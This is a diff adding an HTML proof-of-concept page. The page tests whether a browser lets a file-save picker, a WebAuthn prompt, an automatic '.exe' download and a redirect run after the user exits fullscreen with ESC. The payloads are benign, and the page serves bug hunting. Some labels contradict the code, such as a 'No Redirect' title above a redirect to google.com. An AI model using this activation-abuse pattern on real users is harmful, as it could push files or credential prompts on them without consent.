@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+<body style="background:#111; color:#fff; text-align:center; font-family:sans-serif;">
+
+<h2>SUPER PoC - All Permissions After ESC Fullscreen (Save File + No Redirect)</h2>
+<button id="start" style="font-size:22px; padding:12px 24px;">Start</button>
+
+<pre id="log" style="text-align:left; margin:20px auto; width:90%; max-width:900px; background:#000; padding:16px; border-radius:8px; overflow:auto;"></pre>
+
+<script>
+// Simple logger
+const out = msg => {
+    console.log("[PoC]", msg);
+    document.getElementById("log").textContent += msg + "\n";
+};
+
+// Request fullscreen
+async function goFullscreen() {
+    try {
+        await document.body.requestFullscreen();
+        out("[OK] Fullscreen entered. PRESS ESC.");
+    } catch (e) {
+        out("[FAIL] Fullscreen blocked: " + e.message);
+    }
+}
+
+document.getElementById("start").onclick = goFullscreen;
+
+// Run tests AFTER ESC
+document.addEventListener("fullscreenchange", async () => {
+    if (document.fullscreenElement !== null) return; // Only after exit fullscreen
+
+    out("\n[EVENT] ESC detected — running ALL permission tests…\n");
+
+    async function test(name, fn) {
+        try {
+            await fn();
+            out(`[BUG] ${name} SUCCESS ❌`);
+        } catch (e) {
+            out(`[EXPECTED] ${name} blocked: ${e.name} ✔`);
+        }
+    }
+
+    // ===========================
+    // SAVE FILE PICKER (.txt)
+    // ===========================
+    if (window.showSaveFilePicker) {
+        test("Save File Picker (.txt)", async () => {
+            const handle = await showSaveFilePicker({
+                suggestedName: "just-test.exe",
+                types: [{
+                    description: "Text Files",
+                    accept: { "text/plain": [".txt"] }
+                }]
+            });
+
+            const writable = await handle.createWritable();
+            await writable.write("Hello from PoC");
+            await writable.close();
+        });
+    }
+
+    // ===========================
+    // WEB AUTHN
+    // ===========================
+    if (navigator.credentials) {
+        test("WebAuthn", () =>
+            navigator.credentials.get({
+                publicKey: {
+                    challenge: new Uint8Array(32),
+                    timeout: 60000,
+                    rpId: window.location.hostname,
+                    userVerification: "required",
+                    allowCredentials: []
+                }
+            })
+        );
+    }
+
+    // ===========================
+    // AUTO DOWNLOAD
+    // ===========================
+    test("Auto Download", () => {
+        const a = document.createElement("a");
+        a.href = URL.createObjectURL(new Blob(["Hello"], { type: "text/plain" }));
+        a.download = "test.exe";
+        a.click();
+    });
+
+    // ===========================
+    // REDIRECT KE LOCALHOST
+    // ===========================
+    out("[INFO] Redirecting ke http://localhost …");
+    window.location.href = "http://google.com";
+
+});
+</script>
+
+</body>
+</html>
